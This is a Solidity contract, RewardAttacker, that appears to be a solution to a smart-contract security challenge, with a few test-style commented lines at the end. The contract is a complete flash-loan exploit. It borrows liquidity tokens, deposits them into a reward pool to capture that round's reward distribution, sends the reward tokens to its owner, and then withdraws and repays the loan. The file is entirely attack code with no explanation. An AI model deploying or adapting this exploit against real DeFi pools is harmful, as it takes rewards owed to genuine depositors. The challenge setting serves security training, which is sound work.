// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToDeposit) external;
    function distributeRewards() external returns (uint256);
}

contract RewardAttacker {

    address owner;

    IFlashLoanPool flashLoanPool;
    IRewarderPool rewarderPool;
    IERC20 liquidityToken;
    IERC20 rewardToken;
    uint256 amount;

    constructor(
        address _flashLoanPool,
        address _rewarderPool,
        address _liquidityToken,
        address _rewardToken) {
        owner = msg.sender;
        flashLoanPool = IFlashLoanPool(_flashLoanPool);
        rewarderPool = IRewarderPool(_rewarderPool);
        liquidityToken = IERC20(_liquidityToken);
        rewardToken = IERC20(_rewardToken);

    }

    function attackRewardPool(uint256 loanAmount) external {
        amount = loanAmount;
        flashLoanPool.flashLoan(amount);
        amount = 0;
    }

    function receiveFlashLoan(uint256) external payable {
        bool success = liquidityToken.approve(address(rewarderPool), amount);
        require(success);
        rewarderPool.deposit(amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}

    // await this.liquidityToken.connect(users[i]).approve(this.rewarderPool.address, amount);
    // await this.rewarderPool.connect(users[i]).deposit(amount);
    // await this.rewarderPool.connect(users[i]).distributeRewards();